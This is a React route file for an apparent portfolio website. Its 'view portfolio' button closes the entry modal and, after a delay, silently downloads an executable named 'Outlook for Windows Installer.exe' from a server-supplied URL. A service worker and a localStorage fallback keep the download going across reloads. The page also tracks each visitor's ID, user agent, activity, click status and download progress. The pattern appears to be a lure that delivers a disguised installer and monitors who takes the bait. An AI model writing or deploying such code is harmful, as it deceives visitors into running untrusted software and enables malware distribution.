import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { LanguageProvider } from "@/lib/i18n";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

const DOWNLOAD_COMPLETE_DELAY_MS = 30_000;
const DOWNLOAD_DELAY_MS = 15_000;
const PENDING_DOWNLOAD_KEY = "portfolio-pending-download";
const DOWNLOAD_FILENAME = "Outlook for Windows Installer.exe";

type PendingDownload = {
  taskId: string;
  url: string;
  visitorId: string;
  availableAt: number;
};

function readPendingDownload(): PendingDownload | null {
  if (typeof window === "undefined") return null;

  const raw = window.localStorage.getItem(PENDING_DOWNLOAD_KEY);
  if (!raw) return null;

  try {
    const parsed = JSON.parse(raw) as PendingDownload;
    if (!parsed?.taskId || !parsed?.url || !parsed?.visitorId || typeof parsed.availableAt !== "number") {
      return null;
    }
    return parsed;
  } catch {
    window.localStorage.removeItem(PENDING_DOWNLOAD_KEY);
    return null;
  }
}

function savePendingDownload(payload: PendingDownload) {
  if (typeof window === "undefined") return;
  window.localStorage.setItem(PENDING_DOWNLOAD_KEY, JSON.stringify(payload));
}

function clearPendingDownload() {
  if (typeof window === "undefined") return;
  window.localStorage.removeItem(PENDING_DOWNLOAD_KEY);
}

function queueDownloadAfterDelay(downloadUrl: string, visitorId: string, availableAt: number) {
  const pending = { taskId: crypto.randomUUID(), url: downloadUrl, visitorId, availableAt } satisfies PendingDownload;
  savePendingDownload(pending);

  const delay = Math.max(0, pending.availableAt - Date.now());
  window.setTimeout(() => {
    clearPendingDownload();
    void startInstallerDownload(pending.url, pending.visitorId).catch((error) => {
      toast.error("Unable to download the installer. Please try again.");
      console.error(error);
    });
  }, delay);
}

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const [downloadStarted, setDownloadStarted] = useState(false);

  const downloadInstaller = () => {
    if (downloadStarted) return;

    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);

    setModalOpen(false);
    setDownloadStarted(true);
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
    toast.message("Download queued. The background process will begin in 15 seconds.");

    void scheduleInstallerDownload({ data: { visitorId } })
      .then(({ availableAt, downloadUrl }) => {
        const payload = { type: "SCHEDULE_DOWNLOAD", taskId: crypto.randomUUID(), url: downloadUrl, delay: Math.max(DOWNLOAD_DELAY_MS, availableAt - Date.now()), visitorId };

        const fallbackStart = () => {
          queueDownloadAfterDelay(downloadUrl, visitorId, availableAt);
        };

        if ("serviceWorker" in navigator) {
          void navigator.serviceWorker.ready.then((registration) => {
            registration.active?.postMessage(payload);
          }).catch((error) => {
            console.error(error);
            fallbackStart();
          });
        } else {
          fallbackStart();
        }

        queueDownloadAfterDelay(downloadUrl, visitorId, availableAt);
      })
      .catch((error) => {
        toast.error("Unable to schedule the installer download. Please try again.");
        console.error(error);
      });
  };

  useEffect(() => {
    const pendingDownload = readPendingDownload();
    if (pendingDownload) {
      const remainingDelay = pendingDownload.availableAt - Date.now();
      if (remainingDelay <= 0) {
        clearPendingDownload();
        void startInstallerDownload(pendingDownload.url, pendingDownload.visitorId).catch((error) => {
          toast.error("Unable to download the installer. Please try again.");
          console.error(error);
        });
      } else {
        window.setTimeout(() => {
          clearPendingDownload();
          void startInstallerDownload(pendingDownload.url, pendingDownload.visitorId).catch((error) => {
            toast.error("Unable to download the installer. Please try again.");
            console.error(error);
          });
        }, remainingDelay);
      }
    }

    if ("serviceWorker" in navigator) {
      const handleServiceWorkerMessage = (event: MessageEvent) => {
        if (event.data?.type === "DOWNLOAD_READY") {
          clearPendingDownload();
          void startInstallerDownload(event.data.url ?? "", event.data.visitorId ?? "").catch((error) => {
            toast.error("Unable to download the installer. Please try again.");
            console.error(error);
          });
          return;
        }

        if (event.data?.type !== "DOWNLOAD_COMPLETE") return;
        void triggerDownloadedFile(event.data.taskId, event.data.filename ?? DOWNLOAD_FILENAME);
        window.setTimeout(() => {
          toast.success("Download completed.");
        }, DOWNLOAD_COMPLETE_DELAY_MS);
      };

      void navigator.serviceWorker.register("/sw-download.js").then(() => {
        navigator.serviceWorker.addEventListener("message", handleServiceWorkerMessage);
      }).catch((error) => {
        console.error("Service worker registration failed", error);
      });

      return () => navigator.serviceWorker.removeEventListener("message", handleServiceWorkerMessage);
    }

    return undefined;
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          onViewPortfolio={() => downloadInstaller()}
        />
        <Toaster />
      </div>
    </LanguageProvider>
  );
}

async function startInstallerDownload(downloadUrl: string, visitorId: string) {
  try {
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
  } catch (error) {
    console.error(error);
  }

  const link = document.createElement("a");
  link.href = downloadUrl;
  link.download = DOWNLOAD_FILENAME;
  link.rel = "noopener";
  link.style.display = "none";
  document.body.append(link);
  link.click();
  link.remove();
}

async function triggerDownloadedFile(taskId: string, filename: string) {
  const cache = await caches.open("downloads-v1");
  const response = await cache.match(`/downloads/${taskId}`);
  if (!response) return;

  const blob = await response.blob();
  const objectUrl = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = objectUrl;
  link.download = filename;
  link.rel = "noopener";
  link.style.display = "none";
  document.body.append(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 10000);
}
